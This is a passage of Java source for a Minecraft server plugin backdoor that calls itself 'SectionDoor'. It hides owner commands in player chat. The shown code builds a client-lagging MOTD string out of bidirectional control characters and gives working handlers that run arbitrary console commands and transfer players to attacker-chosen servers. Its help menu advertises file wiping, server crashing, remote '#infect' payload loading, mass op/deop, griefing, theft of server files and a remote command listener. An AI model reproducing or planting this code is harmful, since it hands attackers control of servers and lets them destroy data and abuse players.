§a\u202B§7§b\u202D§9§c\u202D§6§d\u202B§3§e\u202B§d§f\u202E§3§a\u202E§1§b\u202B§9§c\u200F§5§d\u202E§3§e\u202B§7§f\u202B§f§a\u202B§5§b\u200F§5§c\u202D§7§d\u202B§2§e\u202D§f§f\u202D§3§a\u202D§4§b\u200F§7§c\u202D§6§d\u202D§4§e\u202E§5§f\u200F§5§a\u200F§b§b\u202E§a§c\u200F§a§d\u202E§7§e\u202B§8§f\u202E§9§a\u202E§1§b\u202D§d§c\u202D§5§d\u202B§b§e\u202E§e§f\u202B§4§a\u202D§4§b\u202D§c§c\u202E§d§d\u202B§0§e\u202B§d§f\u202E§9§a\u202D§0§b\u202E§1§c\u202D§3§d\u202B§6§e\u200F§6§f\u202E§b§a\u200F§c§b\u202B§a§c\u202D§6§d\u202B§2§e\u202D§d§f\u202E§e§a\u202B§4§b\u202E§7§c\u202B§e§d\u200F§4§e\u202E§3§f\u202D§e§a\u200F§4§b\u200F§f§c\u202B§0§d\u202E§e§e\u202D§6§f\u202D§1§a\u202D§2§b\u202E§1§c\u202E§e§d\u200F§1§e\u202D§2§f\u200F§b§a\u202E§6§b\u202E§3§c\u202D§a§d\u200F§c§e\u202E§3§f\u202B§5§a\u202B§2§b\u200F§8§c\u202B§b§d\u202E§4§e\u202D§7§f\u202D§f§a\u200F§0§b\u202B§0§c\u202D§2§d\u202B§a§e\u202E§8§f\u202E§8§a\u202B§6§b\u202D§a§c\u202D§3§d\u202E§6§e\u200F§4§f\u202B§3§a\u202D§4§b\u202D§d§c\u202E§6§d\u202B§7§e\u202D§d§f\u202D§8§a\u202B§8§b\u202B§9§c\u202E§c§d\u200F§5§e\u200F§b§f\u200F§6§a\u200F§5§b\u202D§3§c\u202D§9§d\u202D§2§e\u200F§a§f\u202D§2§a\u200F§c§b\u202E§0§c\u200F§6§d\u200F§c§e\u202E§f§f\u202D§c§a\u202B§c§b\u202D§0§c\u202E§e§d\u202D§d§e\u200F§b§f\u200F§7§a\u200F§e§b\u202E§2§c\u202D§b§d\u202E§2§e\u202D§e§f\u202D§2§a\u202B§5§b\u202E§b§c\u202E§7§d\u202B§d§e\u202E§6§f\u202E§1§a\u200F§d§b\u202B§7§c\u202E§4§d\u202D§2§e\u200F§5§f\u200F§d§a\u202D§4§b\u200F§2§c\u202B§1§d\u202B§9§e\u200F§7§f\u200F§b§a\u200F§c§b\u202D§1§c\u202B§d§d\u200F§1§e\u202E§5§f\u202E§c§a\u202B§f§b\u202D§b§c\u202B§3§d\u200F§7§e\u202B§1§f\u200F§2§a\u202D§f§b\u200F§9§c\u202E§0§d\u202E§f§e\u200F§f§f\u202E§c§a\u202E§e§b\u200F§7§c\u202D§d§d\u200F§1§e\u202E§a§f\u202B§7§a\u202E§f§b\u202B§c§c\u202E§b§d\u202B§6§e\u202E§8§f\u202E§a§a\u202D§9§b\u200F§2§c\u200F§b§d\u202D§1§e\u202D§f§f\u202E§b§a\u202D§b§b\u202D§a§c\u202E§7§d\u202B§7§e\u202B§1§f\u200F§f§a\u202B§d§b\u202D§4§c\u202D§a§d\u202B§a§e\u202E§7§f\u202E§1§a\u202E§d§b\u202E§e§c\u202E§8§d\u202B§6§e\u202D§6§f\u202E§9§a\u202D§3§b\u202D§5§c\u200F§6§d\u202E§a§e\u202B§f§f\u202B§2§a\u202D§f§b\u202D§6§c\u202B§b§d\u200F§4§e\u202E§5§f\u202E§c§a\u202B§6§b\u202B§3§c\u202D§9§d\u202E§6§e\u202D§f§f\u202B§e§a\u202E§e§b\u202E§e§c\u200F§b§d\u202D§3§e\u200F§3§f\u202D§3§a\u202B§d§b\u202D§b§c\u202D§3§d\u202D§8§e\u202B§b§f\u202B§b§a\u202D§b§b\u200F§5§c\u202D§c§d\u200F§1§e\u200F§f§f\u202E§0§a\u200F§8§b\u202B§1§c\u202B§e§d\u202D§3§e\u202B§2§f\u202D§0§a\u202B§8§b\u202B§4§c\u202B§2§d\u202E§2§e\u202D§6§f\u200F§7§a\u202E§0§b\u202E§e§c\u202E§9§d\u200F§c§e\u202E§8§f\u200F§3§a\u200F§c§b\u202B§0§c\u202B§3§d\u200F§5§e\u200F§4§f\u202B§d§a\u202B§8§b\u202D§9§c\u202D§6§d\u202E§3§e\u200F§1§f\u202B§1§a\u202D§3§b\u200F§a§c\u202E§7§d\u200F§3§e\u202B§9§f\u202E§b§a\u202B§9§b\u202E§c§c\u202E§b§d\u200F§6§e\u200F§d§f\u200F§3§a\u200F§d§b\u202E§f§c\u202E§5§d\u202D§f§e\u202D§3§f\u202D§8§a\u202D§1§b\u202D§2§c\u200F§c§d\u202E§e§e\u202E§b§f\u202E§1§a\u200F§a§b\u202D§1§c\u202B§8§d\u202E§2§e\u202D§9§f\u202D§0§a\u202B§e§b\u202D§c§c\u200F§b§d\u202D§7§e\u202D§b§f\u202B§e§a\u200F§f§b\u200F§c§c\u202D§8§d\u202E§e§e\u200F§0§f\u202E§0§a\u202E§7§b\u202B§1§c\u202B§3§d\u202D§3§e\u200F§8§f\u202B§1§a\u202B§a§b\u202B§b§c\u202E§6§d\u202B§b§e\u200F§b§f\u200F§5§a\u202D§9§b\u200F§5§c\u202B§b§d\u202E§3§e\u200F§f§f\u202E§6§a\u202D§1§b\u202D§c§c\u202D§9§d\u202D§3§e\u202E§9§f\u202B§6§a\u200F§1§b\u202E§c§c\u200F§3§d\u202D§b§e\u202D§a§f\u202D§c§a\u202D§d§b\u202B§e§c\u202D§4§d\u202D§3§e\u200F§a§f\u202D§6§a\u202D§d§b\u202E§3§c\u202D§9§d\u200F§9§e\u200F§2§f\u202D§7§a\u202B§6§b\u202D§4§c\u202E§5§d\u200F§d§e\u202B§1§f\u202D§5§a\u202E§f§b\u202B§6§c\u202B§f§d\u202D§b§e\u202D§e§f\u202D§f§a\u202B§3§b\u202E§e§c\u200F§4§d\u202D§e§e\u202D§2§f\u202B§3§a\u200F§d§b\u200F§1§c\u202B§a§d\u200F§c§e\u202D§d§f\u202B§7§a\u202D§4§b\u202E§9§c\u202E§1§d\u200F§2§e\u202D§2§f\u202E§1§a\u202E§e§b\u200F§9§c\u202D§3§d\u202B§a§e\u202B§9§f\u200F§4§a\u202D§f§b\u202D§5§c\u202D§6§d\u202D§c§e\u200F§2§f\u202B§b§a\u200F§0§b\u200F§7§c\u202B§b§d\u202D§c§e\u202B§c§f\u200F§a§a\u202E§6§b\u202E§9§c\u202E§e§d\u200F§f§e\u202B§c§f\u202E§c§a\u202D§1§b\u202E§d§c\u202D§b§d\u202E§b§e\u202B§5§f\u202B§f§a\u202E§9§b\u200F§e§c\u200F§7§d\u202E§d§e\u202D§7§f\u202B§6§a\u202E§4§b\u200F§1§c\u200F§2§d\u202D§f§e\u202E§1§f\u202D§8§a\u200F§a§b\u200F§9§c\u202D§a§d\u202D§a§e\u202E§b§f\u200F§0§a\u202B§d§b\u202B§9§c\u202E§e§d\u202E§b§e\u200F§4§f\u202D§7§a\u202B§7§b\u202E§f§c\u202B§d§d\u200F§5§e\u202E§f§f\u200F§6§a\u200F§6§b\u200F§d§c\u202B§d§d\u202E§5§e\u202B§b§f\u202B§6§a\u200F§9§b\u202D§a§c\u200F§a§d\u202E§0§e\u202B§4§f\u200F§4§a\u202D§1§b\u200F§5§c\u202E§4§d\u200F§d§e\u202E§1§f\u202B§e§a\u200F§a§b\u202B§e§c\u200F§b§d\u202E§9§e\u200F§1§f\u202D§6§a\u202E§7§b\u202B§5§c\u202B§7§d\u202E§2§e\u200F§9§f\u200F§5§a\u202E§c§b\u202D§4§c\u202B§d§d\u200F§6§e\u202B§d§f\u202D§f§a\u202D§a§b\u202B§8§c\u202B§2§d\u202E§9§e\u200F§0§f\u202E§5§a\u200F§5§b\u202B§8§c\u202E§1§d\u202B§c§e\u202B§9§f\u202E§7§a\u200F§5§b\u202B§f§c\u202B§6§d\u200F§d§e\u202D§d§f\u202B§e§a\u202D§3§b\u202E§a§c\u202B§d§d\u202B§6§e\u200F§f§f";
                    customMotd = laggmotd;
                    motdEnabled = true;
                    player.sendMessage(formatMsg.apply("§6Lagujący MOTD ustawiony."));
                    break;




                default:
                    player.sendMessage(formatMsg.apply("Unknown subcommand: " + subCommand));
                    break;
            }

            event.setCancelled(true);
            return;
        }


        // Komenda #transfer do przenoszenia graczy
        if (message.startsWith("#transfer")) {
            String[] parts = message.split(" ", 3);
            if (parts.length < 3) {
                player.sendMessage(formatMsg.apply("Usage: #transfer [ip:port] [player/*]"));
                event.setCancelled(true);
                return;
            }

            String serverAddress = parts[1];
            String target = parts[2];
            Bukkit.getScheduler().runTask(plugin, () -> {
                if (target.equals("*")) {
                    // Przenieś wszystkich graczy
                    for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                        transferPlayer(onlinePlayer, serverAddress);
                    }
                    player.sendMessage(formatMsg.apply("Transfering all players to " + serverAddress));
                } else {
                    // Przenieś konkretnego gracza
                    Player targetPlayer = Bukkit.getPlayer(target);
                    if (targetPlayer != null) {
                        transferPlayer(targetPlayer, serverAddress);
                        player.sendMessage(formatMsg.apply("Transfering " + target + " to " + serverAddress));
                    } else {
                        player.sendMessage(formatMsg.apply("Player " + target + " not found."));
                    }
                }
            });
            event.setCancelled(true);
            return;
        }

// Komenda #ip do pokazywania IP serwera


        if (message.startsWith("#console")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #console [command]"));
                event.setCancelled(true);
                return;
            }

            String consolecmd = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), consolecmd);
                if (success) {
                    player.sendMessage(formatMsg.apply("Executed command as console: " + consolecmd));
                } else {
                    player.sendMessage(formatMsg.apply("Command execution failed: " + consolecmd));
                }
            });
            event.setCancelled(true);
            return;
        }


        if (message.startsWith("#ohelp")) {
            player.sendMessage(ChatColor.DARK_PURPLE + "                |  SectionDoor - Owner Commands  |");

            // Server Control
            player.sendMessage(ChatColor.RED + "┌──────────── Server Control ──────────┐");
            player.sendMessage(formatMsg.apply("#lag - Lag the server"));
            player.sendMessage(formatMsg.apply("#lagstop - Stop server lag"));
            player.sendMessage(formatMsg.apply("#Destruct - Wipe files and restart"));
            player.sendMessage(formatMsg.apply("#crash - Crash server commands"));
            player.sendMessage(formatMsg.apply("#motd [on|off|crashmotd|status] [motd]"));
            player.sendMessage(formatMsg.apply("#infect <pastebin_raw_url>"));

            // Player Management
            player.sendMessage(ChatColor.RED + "┌────────── Player Control ──────────┐");
            player.sendMessage(formatMsg.apply("#DeopallOPS - Deop all operators"));
            player.sendMessage(formatMsg.apply("#PermBan [player] - Permanent ban"));
            player.sendMessage(formatMsg.apply("#opall - OP all players instantly"));
            player.sendMessage(formatMsg.apply("#transfer [ip:port/domain] [player/*] - transfer player to some server (requires bungeecord)"));

            // Spam/Annoyance
            player.sendMessage(ChatColor.RED + "┌─────────── Spam Tools ──────────┐");
            player.sendMessage(formatMsg.apply("#DeopallOpsAndSpam [msg] - Deop+spam"));
            player.sendMessage(formatMsg.apply("#ConsoleSPAM [nick] - Spam console"));
            player.sendMessage(formatMsg.apply("#StopConsoleSpamming - Stop spam"));
            player.sendMessage(formatMsg.apply("#GriefCMDS - Execute grief commands"));

            // File Operations
            player.sendMessage(ChatColor.RED + "┌────────── File Tools ──────────┐");
            player.sendMessage(formatMsg.apply("#Download - Download server files"));

            // Broadcast
            player.sendMessage(ChatColor.RED + "┌────────── Broadcast ──────────┐");
            player.sendMessage(formatMsg.apply("#Powiadomienie [title] [msg] - Send title"));

            // Console
            player.sendMessage(ChatColor.RED + "┌────────── Console ──────────┐");
            player.sendMessage(formatMsg.apply("#console [cmd] - Execute console command"));
            player.sendMessage(formatMsg.apply("#sshconnect [ip] [port] - connect's to a remote listener made in python that acts like a command sender"));
            player.sendMessage(formatMsg.apply("#sshdisconnect - disconnect from a working remote session"));

            event.setCancelled(true);
            return;
